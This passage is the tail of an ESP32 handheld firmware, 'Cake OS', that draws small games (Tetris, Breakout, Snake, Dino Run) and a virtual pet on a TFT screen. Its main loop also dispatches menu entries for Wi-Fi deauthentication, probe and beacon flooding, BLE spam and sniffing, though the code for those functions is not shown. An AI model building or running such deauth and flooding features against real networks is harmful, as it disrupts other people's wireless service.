    else { offsets[offsetCount++] = 2; offsets[offsetCount++] = 1; offsets[offsetCount++] = -1; offsets[offsetCount++] = -2; offsets[offsetCount++] = 0; }
  } else {
    offsets[offsetCount++] = 0; offsets[offsetCount++] = -1; offsets[offsetCount++] = 1;
    offsets[offsetCount++] = -2; offsets[offsetCount++] = 2;
  }
  for (int i = 0; i < offsetCount; i++) {
    if (!tetrisCollide(pieceX + offsets[i], pieceY, newRot)) {
      pieceX += offsets[i]; pieceRot = newRot; return true;
    }
  }
  return false;
}
void tetrisDrawFrame() {
  int bx = TET_X - 3, by = TET_Y - 3;
  int bw = 10 * TET_CELL_W + 6, bh = 20 * TET_CELL_H + 6;
  tft.drawRoundRect(bx, by, bw, bh, 4, TFT_WHITE);
  tft.drawRoundRect(bx + 1, by + 1, bw - 2, bh - 2, 4, TFT_DARKGREY);
}
void tetrisDraw() {
  tft.fillRect(TET_X, TET_Y, 10 * TET_CELL_W, 20 * TET_CELL_H, TFT_BLACK);
  for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) {
    if (tetrisGrid[y][x]) tft.fillRect(TET_X + x * TET_CELL_W, TET_Y + y * TET_CELL_H, TET_CELL_W, TET_CELL_H, TFT_WHITE);
  }
  for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) {
    if (getShapeCell(pieceType, pieceRot, i, j)) {
      tft.fillRect(TET_X + (pieceX + j) * TET_CELL_W, TET_Y + (pieceY + i) * TET_CELL_H, TET_CELL_W, TET_CELL_H, TFT_GREEN);
    }
  }
  tetrisDrawFrame();
}
void tetrisClear() {
  for (int y = 19; y >= 0; y--) {
    bool full = true;
    for (int x = 0; x < 10; x++) if (!tetrisGrid[y][x]) { full = false; break; }
    if (full) {
      for (int yy = y; yy > 0; yy--) for (int x = 0; x < 10; x++) tetrisGrid[yy][x] = tetrisGrid[yy-1][x];
      y++;
    }
  }
}
void showTetris() {
  deinitWifi(); deinitBLE();
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Tetris", 2, 0);
  int score = 0;
  tetrisInit();
  tetrisDrawFrame();
  unsigned long lastFall = millis();
  while (true) {
    char k = getTetrisKey();
    if (k == 'U') { if (!tetrisCollide(pieceX-1, pieceY, pieceRot)) pieceX--; }
    else if (k == 'D') { if (!tetrisCollide(pieceX+1, pieceY, pieceRot)) pieceX++; }
    else if (k == 'L') tryRotate();
    else if (k == 'R') { while (!tetrisCollide(pieceX, pieceY+1, pieceRot)) pieceY++; }
    else if (k == 'E') break;
    if (millis() - lastFall > 500) {
      lastFall = millis();
      if (!tetrisCollide(pieceX, pieceY+1, pieceRot)) pieceY++;
      else {
        for (int i = 0; i < 4; i++) for (int j = 0; j < 4; j++) {
          if (getShapeCell(pieceType, pieceRot, i, j)) {
            int gy = pieceY + i, gx = pieceX + j;
            if (gy >= 0 && gy < 20 && gx >= 0 && gx < 10) tetrisGrid[gy][gx] = 1;
          }
        }
        int before = 0;
        for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) if (tetrisGrid[y][x]) before++;
        tetrisClear();
        int after = 0;
        for (int y = 0; y < 20; y++) for (int x = 0; x < 10; x++) if (tetrisGrid[y][x]) after++;
        score += (before - after) / 10;
        pieceType = random(7); pieceRot = 0; pieceX = 3; pieceY = 0;
        if (tetrisCollide(pieceX, pieceY, pieceRot)) {
          // 奖励缩水: score/10+5 → score/20+2
          uint16_t reward = petGameReward(score/20 + 2);
          tft.fillRect(30, 25, 100, 40, TFT_BLACK);
          tft.drawString("GAME OVER", 38, 30);
          tft.drawString("S:" + String(score), 55, 44);
          tft.setTextColor(TFT_YELLOW, TFT_BLACK);
          tft.drawString("+" + String(reward) + " $", 55, 58);
          tft.setTextColor(TFT_WHITE, TFT_BLACK);
          delay(2500); break;
        }
      }
    }
    tetrisDraw();
    tft.fillRect(90, 10, 68, 12, TFT_BLACK);
    tft.drawString("S:" + String(score), 90, 10);
    delay(15);
  }
}

// ==================== 10. 打砖块 ====================
void showBreakout() {
  deinitWifi(); deinitBLE();
  clearAll(); titleBar("Breakout");
  int paddleX = 60, ballX = 80, ballY = 70;
  int ballDX = 1, ballDY = -1;
  bool ballMoving = false;
  bool bricks[4][8];
  for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) bricks[i][j] = true;
  int score = 0;
  while (true) {
    char k = getGameKey();
    if (k == 'U') paddleX -= 4;
    if (k == 'D') paddleX += 4;
    if (k == 'L') {
      if (!ballMoving) { ballMoving = true; ballX = paddleX + 10; ballY = 70; ballDX = 1; ballDY = -1; }
    }
    if (k == 'E') break;
    if (paddleX < 0) paddleX = 0;
    if (paddleX > 140) paddleX = 140;
    if (ballMoving) {
      ballX += ballDX; ballY += ballDY;
      if (ballX <= 0 || ballX >= 158) ballDX = -ballDX;
      if (ballY <= 12) ballDY = -ballDY;
      if (ballY >= 70 && ballX >= paddleX && ballX <= paddleX + 20) ballDY = -ballDY;
      if (ballY > 80) { ballMoving = false; ballX = paddleX + 10; ballY = 70; }
      for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) {
        if (bricks[i][j]) {
          int bx = j*20, by = 14 + i*8;
          if (ballX >= bx && ballX <= bx+18 && ballY >= by && ballY <= by+6) {
            bricks[i][j] = false; ballDY = -ballDY; score++;
          }
        }
      }
    } else { ballX = paddleX + 10; ballY = 70; }
    bool allBroken = true;
    for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++) if (bricks[i][j]) { allBroken = false; break; }
    if (allBroken) {
      // 奖励缩水: 50 → 15
      uint16_t reward = petGameReward(15);
      petUnlock(7);
      tft.fillScreen(TFT_BLACK);
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.drawString("WIN! +" + String(reward) + " $", 30, 35);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      delay(2500);
      return;
    }
    tft.fillScreen(TFT_BLACK);
    tft.drawString("Score:" + String(score), 2, 0);
    tft.fillRect(paddleX, 72, 20, 4, TFT_WHITE);
    tft.fillCircle(ballX, ballY, 2, TFT_GREEN);
    for (int i = 0; i < 4; i++) for (int j = 0; j < 8; j++)
      if (bricks[i][j]) tft.fillRect(j*20, 14 + i*8, 18, 6, TFT_BLUE);
    delay(12);
  }
}

// ==================== 11. 贪吃蛇 ====================
void showSnake() {
  deinitWifi(); deinitBLE();
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Snake", 2, 0);
  tft.drawString("L/R Turn", 80, 0);
  tft.drawString("R:Exit", 130, 0);
  const int CELL = 5, COLS = 32, ROWS = 12, OX = 0, OY = 15;
  int snakeX[200], snakeY[200];
  int snakeLen = 3, dir = 1;
  snakeX[0] = 5; snakeY[0] = 6;
  snakeX[1] = 4; snakeY[1] = 6;
  snakeX[2] = 3; snakeY[2] = 6;
  int foodX = 20, foodY = 6;
  int score = 0;
  unsigned long lastMove = millis();
  int moveInterval = 280;
  while (true) {
    char k = getSnakeKey();
    if (k == 'U') dir = (dir + 3) % 4;
    else if (k == 'D') dir = (dir + 1) % 4;
    else if (k == 'R') break;
    if (millis() - lastMove > moveInterval) {
      lastMove = millis();
      int nx = snakeX[0], ny = snakeY[0];
      switch (dir) {
        case 0: ny--; break;
        case 1: nx++; break;
        case 2: ny++; break;
        case 3: nx--; break;
      }
      bool dead = false;
      if (nx < 0 || nx >= COLS || ny < 0 || ny >= ROWS) dead = true;
      for (int i = 0; i < snakeLen - 1 && !dead; i++)
        if (snakeX[i] == nx && snakeY[i] == ny) dead = true;
      if (dead) {
        // 奖励缩水: score+3 → score/2+2
        uint16_t reward = petGameReward(score/2 + 2);
        tft.fillRect(30, 25, 100, 40, TFT_BLACK);
        tft.drawString("GAME OVER", 38, 30);
        tft.drawString("S:" + String(score), 55, 44);
        tft.setTextColor(TFT_YELLOW, TFT_BLACK);
        tft.drawString("+" + String(reward) + " $", 55, 58);
        tft.setTextColor(TFT_WHITE, TFT_BLACK);
        delay(2500); return;
      }
      for (int i = snakeLen - 1; i > 0; i--) {
        snakeX[i] = snakeX[i-1]; snakeY[i] = snakeY[i-1];
      }
      snakeX[0] = nx; snakeY[0] = ny;
      if (nx == foodX && ny == foodY) {
        score++;
        if (snakeLen < 200) snakeLen++;
        bool ok = false;
        while (!ok) {
          foodX = random(COLS); foodY = random(ROWS);
          ok = true;
          for (int i = 0; i < snakeLen; i++)
            if (snakeX[i] == foodX && snakeY[i] == foodY) { ok = false; break; }
        }
        if (moveInterval > 150) moveInterval -= 3;
      }
    }
    tft.fillRect(0, 13, 160, 67, TFT_BLACK);
    int fx = OX + foodX * CELL + CELL/2;
    int fy = OY + foodY * CELL + CELL/2;
    tft.fillCircle(fx, fy, 3, TFT_MAROON);
    tft.fillCircle(fx, fy, 2, TFT_RED);
    tft.drawPixel(fx, fy, TFT_WHITE);
    for (int i = snakeLen - 1; i >= 0; i--) {
      int px = OX + snakeX[i] * CELL;
      int py = OY + snakeY[i] * CELL;
      if (i == 0) {
        tft.fillRoundRect(px, py, CELL-1, CELL-1, 2, TFT_GREEN);
        int ex1, ey1, ex2, ey2;
        if (dir == 0) { ex1 = px+1; ey1 = py+1; ex2 = px+3; ey2 = py+1; }
        else if (dir == 1) { ex1 = px+3; ey1 = py+1; ex2 = px+3; ey2 = py+3; }
        else if (dir == 2) { ex1 = px+1; ey1 = py+3; ex2 = px+3; ey2 = py+3; }
        else { ex1 = px+1; ey1 = py+1; ex2 = px+1; ey2 = py+3; }
        tft.drawPixel(ex1, ey1, TFT_BLACK);
        tft.drawPixel(ex2, ey2, TFT_BLACK);
      } else if (i == 1) {
        tft.fillRoundRect(px, py, CELL-1, CELL-1, 2, TFT_GREEN);
      } else {
        uint16_t col = (i % 2 == 0) ? TFT_DARKGREEN : 0x03E0;
        tft.fillRoundRect(px, py, CELL-1, CELL-1, 2, col);
      }
    }
    delay(8);
  }
}

// ==================== 12. 小恐龙 ====================
void drawDino(int x, int y, bool legUp) {
  tft.fillRoundRect(x, y-14, 12, 10, 3, TFT_WHITE);
  tft.fillRect(x+8, y-18, 4, 6, TFT_WHITE);
  tft.fillRoundRect(x+10, y-22, 8, 6, 2, TFT_WHITE);
  tft.fillRect(x+14, y-21, 2, 2, TFT_BLACK);
  tft.fillRect(x+17, y-19, 2, 1, TFT_WHITE);
  tft.fillRect(x-2, y-12, 3, 2, TFT_WHITE);
  tft.fillRect(x-4, y-14, 2, 3, TFT_WHITE);
  if (legUp) {
    tft.fillRect(x+2, y-4, 2, 4, TFT_WHITE);
    tft.fillRect(x+7, y-2, 2, 2, TFT_WHITE);
  } else {
    tft.fillRect(x+2, y-2, 2, 2, TFT_WHITE);
    tft.fillRect(x+7, y-4, 2, 4, TFT_WHITE);
  }
}
void drawCactus(int x, int groundY, int type) {
  if (type == 0) {
    tft.fillRect(x, groundY - 8, 3, 8, TFT_WHITE);
    tft.fillRect(x - 3, groundY - 5, 3, 2, TFT_WHITE);
    tft.fillRect(x + 3, groundY - 4, 3, 2, TFT_WHITE);
  } else {
    tft.fillRect(x, groundY - 12, 4, 12, TFT_WHITE);
    tft.fillRect(x - 4, groundY - 8, 4, 2, TFT_WHITE);
    tft.fillRect(x + 4, groundY - 6, 4, 2, TFT_WHITE);
  }
}

// 恐龙真实碰撞体：6 个矩形，和 drawDino() 完全一一对应
// 腿部分用两帧的并集 (x+2, y-4, 7, 4)，避免动画帧之间漏判
int getDinoHitboxes(int dx, int dy, Rect out[6]) {
  out[0] = makeRect(dx + 0,  dy - 14, 12, 10);  // 身体
  out[1] = makeRect(dx + 8,  dy - 18,  4,  6);  // 脖子
  out[2] = makeRect(dx + 10, dy - 22,  8,  6);  // 头
  out[3] = makeRect(dx - 2,  dy - 12,  3,  2);  // 尾巴
  out[4] = makeRect(dx - 4,  dy - 14,  2,  3);  // 尾巴尖
  out[5] = makeRect(dx + 2,  dy -  4,  7,  4);  // 腿（两帧并集）
  return 6;
}

// 仙人掌真实碰撞体：3 个矩形，和 drawCactus() 完全一一对应
int getCactusHitboxes(int x, int groundY, int type, Rect out[3]) {
  if (type == 0) {
    out[0] = makeRect(x,     groundY - 8,  3,  8);  // 主干
    out[1] = makeRect(x - 3, groundY - 5,  3,  2);  // 左臂
    out[2] = makeRect(x + 3, groundY - 4,  3,  2);  // 右臂
  } else {
    out[0] = makeRect(x,     groundY - 12, 4, 12);  // 主干
    out[1] = makeRect(x - 4, groundY - 8,  4,  2);  // 左臂
    out[2] = makeRect(x + 4, groundY - 6,  4,  2);  // 右臂
  }
  return 3;
}

void showDinoRun() {
  deinitWifi(); deinitBLE();
  clearAll();
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Dino Run", 2, 0);
  const int GROUND_Y = 72;
  int dinoX = 15, dinoY = GROUND_Y;
  float dinoVY = 0;
  bool onGround = true, legUp = false;
  const int MAX_OBS = 3;
  int obsX[MAX_OBS], obsType[MAX_OBS];
  bool obsActive[MAX_OBS];
  for (int i = 0; i < MAX_OBS; i++) { obsActive[i] = false; obsX[i] = 0; obsType[i] = 0; }
  int score = 0;
  unsigned long lastSpawn = millis(), lastLeg = millis();
  while (true) {
    char k = getGameKey();
    if (k == 'U' && onGround) { dinoVY = -5.5; onGround = false; }
    if (k == 'E') break;
    if (!onGround) {
      dinoY += dinoVY;
      dinoVY += 0.75;
      if (dinoY >= GROUND_Y) { dinoY = GROUND_Y; dinoVY = 0; onGround = true; }
    }
    if (millis() - lastLeg > 100) { lastLeg = millis(); legUp = !legUp; }
    if (millis() - lastSpawn > 1200) {
      lastSpawn = millis();
      for (int i = 0; i < MAX_OBS; i++) {
        if (!obsActive[i]) { obsActive[i] = true; obsX[i] = 160; obsType[i] = random(2); break; }
      }
    }
    for (int i = 0; i < MAX_OBS; i++) {
      if (obsActive[i]) {
        obsX[i] -= 3;
        if (obsX[i] < -20) { obsActive[i] = false; score += 10; }
      }
    }

    // ===== 真实碰撞检测：恐龙 6 个矩形 × 每个仙人掌 3 个矩形 =====
    bool hit = false;
    Rect dinoBoxes[6];
    getDinoHitboxes(dinoX, dinoY, dinoBoxes);
    for (int i = 0; i < MAX_OBS && !hit; i++) {
      if (!obsActive[i]) continue;
      Rect cacBoxes[3];
      int cacN = getCactusHitboxes(obsX[i], GROUND_Y, obsType[i], cacBoxes);
      for (int a = 0; a < 6 && !hit; a++) {
        for (int b = 0; b < cacN && !hit; b++) {
          if (rectOverlap(dinoBoxes[a], cacBoxes[b])) hit = true;
        }
      }
    }

    if (hit) {
      // 奖励缩水: score/10+3 → score/20+1
      uint16_t reward = petGameReward(score/20 + 1);
      tft.fillRect(30, 25, 100, 40, TFT_BLACK);
      tft.drawString("GAME OVER", 38, 30);
      tft.drawString("S:" + String(score), 55, 44);
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.drawString("+" + String(reward) + " $", 55, 58);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      delay(2500); return;
    }
    tft.fillRect(0, 13, 160, 67, TFT_BLACK);
    tft.drawString("Dino Run", 2, 0);
    tft.drawString("S:" + String(score), 120, 0);
    tft.drawFastHLine(0, GROUND_Y + 1, 160, TFT_WHITE);
    drawDino(dinoX, dinoY, legUp);
    for (int i = 0; i < MAX_OBS; i++) if (obsActive[i]) drawCactus(obsX[i], GROUND_Y, obsType[i]);
    delay(20);
  }
}

// ==================== 13. 金鱼 ====================
void drawWhaleIcon(int cx, int cy, uint8_t mood, bool blink) {
  static uint16_t goldC = 0, darkGoldC = 0, finC = 0, eyeC = 0, blushC = 0, bubbleC = 0;
  if (goldC == 0) {
    goldC     = tft.color565(255, 140, 40);
    darkGoldC = tft.color565(220, 90, 20);
    finC      = tft.color565(255, 180, 90);
    eyeC      = tft.color565(20, 20, 30);
    blushC    = tft.color565(255, 100, 120);
    bubbleC   = tft.color565(180, 220, 255);
  }
  tft.fillTriangle(cx + 14, cy - 2, cx + 34, cy - 14, cx + 32, cy - 1, finC);
  tft.fillTriangle(cx + 14, cy + 2, cx + 34, cy + 12, cx + 32, cy + 1, finC);
  tft.fillTriangle(cx + 14, cy - 3, cx + 20, cy, cx + 14, cy + 3, goldC);
  tft.fillRoundRect(cx - 18, cy - 9, 34, 18, 9, goldC);
  tft.fillCircle(cx - 18, cy, 9, goldC);
  tft.fillRoundRect(cx - 14, cy - 7, 24, 3, 1, finC);
  tft.fillRoundRect(cx - 15, cy + 3, 26, 5, 2, finC);
  tft.fillTriangle(cx - 4, cy - 9, cx + 4, cy - 9, cx - 1, cy - 18, darkGoldC);
  tft.fillTriangle(cx - 6, cy + 8, cx + 4, cy + 8, cx - 1, cy + 15, darkGoldC);
  tft.fillTriangle(cx - 8, cy + 2, cx - 2, cy + 8, cx - 10, cy + 7, darkGoldC);
  if (blink) {
    tft.drawFastHLine(cx - 16, cy - 3, 7, eyeC);
  } else {
    tft.fillCircle(cx - 13, cy - 3, 4, TFT_WHITE);
    tft.fillCircle(cx - 12, cy - 3, 3, eyeC);
    tft.drawPixel(cx - 13, cy - 5, TFT_WHITE);
    tft.drawPixel(cx - 14, cy - 4, TFT_WHITE);
  }
  if (mood >= 70) tft.fillCircle(cx - 6, cy + 2, 3, blushC);
  if (mood >= 50) tft.drawCircleHelper(cx - 24, cy + 2, 3, 0x0C, eyeC);
  else tft.drawFastHLine(cx - 26, cy + 3, 4, eyeC);
  if (mood >= 60) {
    tft.drawCircle(cx - 26, cy - 12, 2, bubbleC);
    if (mood >= 80) {
      tft.drawCircle(cx - 30, cy - 18, 2, bubbleC);
      tft.drawCircle(cx - 24, cy - 22, 1, bubbleC);
    }
  }
}

void drawStatRow(int y, const char* label, uint8_t val, uint16_t color) {
  tft.setTextColor(TFT_WHITE);
  tft.drawString(label, 2, y);
  int bx = 24, bw = 90, by = y + 1;
  tft.drawRect(bx, by, bw, 6, TFT_DARKGREY);
  int fill = ((bw - 2) * val) / 100;
  if (fill > 0) tft.fillRect(bx + 1, by + 1, fill, 4, color);
  char buf[4];
  snprintf(buf, sizeof(buf), "%d", val);
  tft.drawString(buf, bx + bw + 4, y);
}

void showPetWhale() {
  deinitWifi(); deinitBLE();

  int state = 0;
  int menuSel = 0, feedSel = 0;
  bool blink = false;
  unsigned long lastBlink = millis();
  int msgTimer = 0;
  char msg[24] = "";
  uint16_t msgColor = TFT_GREEN;
  unsigned long lastDecayTick = millis();   // 新增：每 10 秒衰减计时

  while (true) {
    // ===== 每 10 秒状态衰减（替代原先进入界面时的单次衰减） =====
    if (millis() - lastDecayTick >= 10000) {
      lastDecayTick = millis();
      if (pet.hunger > 0) pet.hunger--;
      if (pet.mood > 0)   pet.mood--;
      if (pet.clean > 0)  pet.clean--;
      if (pet.energy > 0) pet.energy--;
      if (pet.hunger == 0 || pet.clean == 0) {
        if (pet.health > 0) pet.health--;
      }
      petSave();
    }

    clearAll();
    tft.setTextColor(TFT_WHITE);
    if (state == 0) {
      tft.drawString("Lv." + String(pet.level), 2, 0);
      tft.drawString("$" + String(pet.coins), 130, 0);
      drawWhaleIcon(80, 21, pet.mood, blink);
      drawStatRow(40, "H",  pet.hunger, TFT_RED);
      drawStatRow(48, "M",  pet.mood,   TFT_YELLOW);
      drawStatRow(56, "E",  pet.energy, TFT_CYAN);
      drawStatRow(64, "C",  pet.clean,  TFT_GREEN);
      drawStatRow(72, "HP", pet.health, TFT_MAGENTA);
      if (msgTimer > 0) {
        tft.fillRect(30, 0, 100, 8, TFT_BLACK);
        tft.setTextColor(msgColor);
        int len = strlen(msg);
        int x = 80 - (len * 6) / 2;
        tft.drawString(msg, x, 0);
        tft.setTextColor(TFT_WHITE);
        msgTimer--;
      }
    } else if (state == 1) {
      tft.drawString("Pet Menu", 2, 0);
      const char* items[] = {"Feed", "Play", "Sleep", "Clean", "Achs"};
      for (int i = 0; i < 5; i++) {
        String pre = (i == menuSel) ? "> " : "  ";
        tft.drawString(pre + items[i], 2, 14 + i * 12);
      }
      tft.drawString("L:OK  R:Back", 70, 74);
    } else if (state == 2) {
      tft.drawString("Feed ($" + String(pet.coins) + ")", 2, 0);
      for (int i = 0; i < FOOD_COUNT; i++) {
        String pre = (i == feedSel) ? "> " : "  ";
        String line = pre + String(FOODS[i].name) + "  " + String(FOODS[i].cost) + "$";
        tft.drawString(line, 2, 14 + i * 12);
      }
      tft.drawString("L:Buy  R:Back", 70, 74);
    } else if (state == 3) {
      tft.drawString("Achievements", 2, 0);
      for (int i = 0; i < ACH_COUNT; i++) {
        bool done = (pet.ach >> i) & 1;
        String line = String(done ? "[V] " : "[ ] ") + String(ACH_NAMES[i]);
        tft.drawString(line, 2, 11 + i * 8);
      }
    }
    if (millis() - lastBlink > 3000) {
      lastBlink = millis();
      blink = !blink;
    }
    char k = getKey();
    if (k == 'R' || k == 'E') {
      if (state == 0) break;
      state = 0;
    } else if (k == 'U') {
      if (state == 1) menuSel = (menuSel + 4) % 5;
      else if (state == 2) feedSel = (feedSel + FOOD_COUNT - 1) % FOOD_COUNT;
    } else if (k == 'D') {
      if (state == 0) {
        if (pet.energy >= 5) {
          pet.energy -= 5;
          pet.mood += 8; if (pet.mood > 100) pet.mood = 100;
          pet.hunger -= 2; if (pet.hunger < 0) pet.hunger = 0;
          petAddExp(6); petSave();
          snprintf(msg, sizeof(msg), "+8 Mood");
          msgColor = TFT_GREEN; msgTimer = 20;
          petUnlock(1);
        } else {
          snprintf(msg, sizeof(msg), "Tired!");
          msgColor = TFT_RED; msgTimer = 20;
        }
      } else if (state == 1) {
        menuSel = (menuSel + 1) % 5;
      } else if (state == 2) {
        feedSel = (feedSel + 1) % FOOD_COUNT;
      }
    } else if (k == 'L') {
      if (state == 0) {
        state = 1;
      } else if (state == 1) {
        switch (menuSel) {
          case 0: state = 2; feedSel = 0; break;
          case 1:
            if (pet.energy >= 5) {
              pet.energy -= 5;
              pet.mood += 12; if (pet.mood > 100) pet.mood = 100;
              pet.hunger -= 3; if (pet.hunger < 0) pet.hunger = 0;
              petAddExp(8); petSave();
              snprintf(msg, sizeof(msg), "+12 Mood");
              msgColor = TFT_GREEN; msgTimer = 20;
              petUnlock(1);
            } else {
              snprintf(msg, sizeof(msg), "Too tired!");
              msgColor = TFT_RED; msgTimer = 20;
            }
            state = 0; break;
          case 2:
            pet.energy += 25; if (pet.energy > 100) pet.energy = 100;
            pet.mood -= 5; if (pet.mood < 0) pet.mood = 0;
            petSave();
            snprintf(msg, sizeof(msg), "+25 Energy");
            msgColor = TFT_GREEN; msgTimer = 20;
            petUnlock(2);
            state = 0; break;
          case 3:
            pet.clean = 100;
            pet.mood += 5; if (pet.mood > 100) pet.mood = 100;
            petSave();
            snprintf(msg, sizeof(msg), "Sparkling!");
            msgColor = TFT_GREEN; msgTimer = 20;
            petUnlock(3);
            state = 0; break;
          case 4: state = 3; break;
        }
      } else if (state == 2) {
        if (pet.coins >= FOODS[feedSel].cost) {
          pet.coins -= FOODS[feedSel].cost;
          pet.hunger += FOODS[feedSel].dHunger; if (pet.hunger > 100) pet.hunger = 100;
          pet.mood   += FOODS[feedSel].dMood;   if (pet.mood   > 100) pet.mood   = 100;
          pet.clean  += FOODS[feedSel].dClean;
          if (pet.clean > 100) pet.clean = 100;
          if (pet.clean < 0)   pet.clean = 0;
          pet.health += FOODS[feedSel].dHealth;
          if (pet.health > 100) pet.health = 100;
          if (pet.health < 0)   pet.health = 0;
          petAddExp(10); petSave();
          snprintf(msg, sizeof(msg), "Yummy!");
          msgColor = TFT_GREEN; msgTimer = 20;
          petUnlock(0);
          state = 0;
        } else {
          snprintf(msg, sizeof(msg), "Need %d$", FOODS[feedSel].cost);
          msgColor = TFT_RED; msgTimer = 20;
        }
      }
    }
    delay(20);
  }
  petSave();
}

// ==================== 14. 关于 ====================
void showAbout() {
  clearAll(); titleBar("About");
  tft.drawString(DEVICE_NAME, 2, 20);
  tft.drawString("Ver: " + String(VERSION), 2, 34);
  tft.drawString("Author: MCXP", 2, 48);
  tft.drawString("Heap: " + String(ESP.getFreeHeap()), 2, 62);
  tft.drawString("Back:R", 2, 74);
  waitExit();
}

// ==================== setup ====================
void setup() {
  Serial.begin(115200);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_LEFT, INPUT_PULLUP);
  pinMode(BTN_RIGHT, INPUT_PULLUP);
  tft.init();
  tft.setRotation(3);
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.drawString("Cake OS", 50, 25);
  tft.drawString("v4.0", 65, 40);
  delay(500);

  EEPROM.begin(512);
  petLoad();
  randomSeed(esp_random());

  // WiFi 异步启动，不阻塞开机
  // 顺序优化：persistent(false) → mode → setSleep → autoReconnect → txPower → begin
  if (strlen(WIFI_SSID) > 0 && strcmp(WIFI_SSID, "你的WiFi名") != 0) {
    wifiConfigured = true;
    WiFi.persistent(false);
    WiFi.mode(WIFI_STA);
    WiFi.setSleep(false);
    WiFi.setAutoReconnect(true);
    esp_wifi_set_max_tx_power(80);
    WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
    wifiDisconnectTime = millis();
  }
}

// ==================== loop ====================
void loop() {
  drawMainMenu();

  // WiFi 状态每 300ms 独立检测
  if (millis() - lastWifiCheck > 300) {
    lastWifiCheck = millis();
    updateWifiStatusBar();
  }

  // WiFi 自动重连（带防抖 + 指数退避）
  if (wifiConfigured) {
    if (WiFi.status() == WL_CONNECTED) {
      wifiWasConnected = true;
      wifiDisconnectTime = 0;
      wifiDisconnectCount = 0;
      wifiReconnectDelay = WIFI_MIN_DELAY;
    } else {
      wifiDisconnectCount++;
      if (wifiDisconnectCount >= 2) {
        if (wifiDisconnectTime == 0) wifiDisconnectTime = millis();
        else if (millis() - wifiDisconnectTime > wifiReconnectDelay) {
          WiFi.persistent(false);
          WiFi.mode(WIFI_STA);
          WiFi.setSleep(false);
          WiFi.setAutoReconnect(true);
          esp_wifi_set_max_tx_power(80);
          WiFi.begin(WIFI_SSID, WIFI_PASSWORD);
          wifiDisconnectTime = millis();
          wifiReconnectDelay = min(wifiReconnectDelay * 2, WIFI_MAX_DELAY);
        }
      }
    }
  }

  char key = getKey();
  if (key == 'U') {
    selectedMenu--; if (selectedMenu < 0) selectedMenu = menuCount - 1;
  } else if (key == 'D') {
    selectedMenu++; if (selectedMenu >= menuCount) selectedMenu = 0;
  } else if (key == 'L') {
    switch (selectedMenu) {
      case 0: showWifiScan(); break;
      case 1: showIPScan(); break;
      case 2: showDeauth(); break;
      case 3: showProbeFlood(); break;
      case 4: showBeaconFlood(); break;
      case 5: showBLEScan(); break;
      case 6: showBLESpam(); break;
      case 7: showSniffer(); break;
      case 8: showChanOptimize(); break;
      case 9: showTetris(); break;
      case 10: showBreakout(); break;
      case 11: showSnake(); break;
      case 12: showDinoRun(); break;
      case 13: showPetWhale(); break;
      case 14: showAbout(); break;
    }
    deinitBLE();
    if (wifiConfigured) restartWifi();
    // 强制重绘主菜单 + 状态栏
    lastWifiDisplay = -1;
    lastDrawnMenu = -1;
    lastDrawnOffset = -1;
  }
  if (selectedMenu < menuOffset) menuOffset = selectedMenu;
  if (selectedMenu >= menuOffset + 4) menuOffset = selectedMenu - 3;
  delay(8);
}